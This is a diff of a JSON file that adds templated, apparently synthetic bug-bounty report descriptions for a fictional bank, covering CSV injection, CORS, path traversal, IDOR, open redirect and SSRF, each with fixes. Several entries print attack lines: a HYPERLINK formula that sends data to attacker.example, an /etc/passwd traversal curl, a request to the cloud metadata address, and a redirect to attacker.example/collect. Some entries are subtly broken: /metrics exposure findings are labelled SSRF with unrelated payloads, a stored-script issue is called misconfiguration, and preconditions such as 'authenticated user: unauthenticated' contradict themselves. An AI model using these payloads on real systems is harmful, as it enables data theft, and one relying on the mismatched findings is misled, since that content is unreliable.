+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.glaciervaultbank.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13866,7 +13972,8 @@
           "offset": "3d 16h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://banking.glaciervaultbank.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13984,7 +14091,8 @@
           "offset": "4d 19h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://banking.glaciervaultbank.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14135,7 +14243,8 @@
           "offset": "8d 9h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://banking.glaciervaultbank.foo/profile`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14291,7 +14400,8 @@
           "offset": "5d 23h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.glaciervaultbank.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14454,7 +14564,8 @@
           "offset": "5d 5h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://banking.glaciervaultbank.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14594,7 +14705,8 @@
           "offset": "4d 1h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.glaciervaultbank.foo/profile`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14705,7 +14817,8 @@
           "offset": "1d 1h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.glaciervaultbank.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14885,7 +14998,8 @@
           "offset": "5d",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.glaciervaultbank.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15031,7 +15145,8 @@
           "offset": "2d 5h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.glaciervaultbank.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15163,7 +15278,8 @@
           "offset": "4d 2h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.glaciervaultbank.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -15330,7 +15446,8 @@
           "offset": "6d",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.glaciervaultbank.foo/export`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15485,7 +15602,8 @@
           "offset": "5d 16h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.glaciervaultbank.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15616,7 +15734,8 @@
           "offset": "6d 23h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.glaciervaultbank.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15735,7 +15854,8 @@
           "offset": "8d 10h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.glaciervaultbank.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15854,7 +15974,8 @@
           "offset": "6d 23h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.glaciervaultbank.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15975,7 +16096,8 @@
           "offset": "2d 17h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.glaciervaultbank.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16074,7 +16196,8 @@
           "offset": "2d 14h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.glaciervaultbank.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16198,7 +16321,8 @@
           "offset": "4d 5h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.glaciervaultbank.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16338,7 +16462,8 @@
           "offset": "5d 4h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.glaciervaultbank.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16445,7 +16570,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.glaciervaultbank.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16571,7 +16697,8 @@
           "offset": "7h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.glaciervaultbank.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16693,7 +16820,8 @@
           "offset": "7d 5h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.glaciervaultbank.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16836,7 +16964,8 @@
           "offset": "6d 16h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.glaciervaultbank.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16956,7 +17085,8 @@
           "offset": "2h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.glaciervaultbank.foo/profile`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17093,7 +17223,8 @@
           "offset": "6d 2h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.glaciervaultbank.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17196,7 +17327,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.glaciervaultbank.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17364,7 +17496,8 @@
           "offset": "4d 13h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.glaciervaultbank.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17506,7 +17639,8 @@
           "offset": "6d 12h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.glaciervaultbank.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17650,7 +17784,8 @@
           "offset": "7h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.glaciervaultbank.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17809,7 +17944,8 @@
           "offset": "6d 12h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.glaciervaultbank.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17918,7 +18054,8 @@
           "offset": "3d 7h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
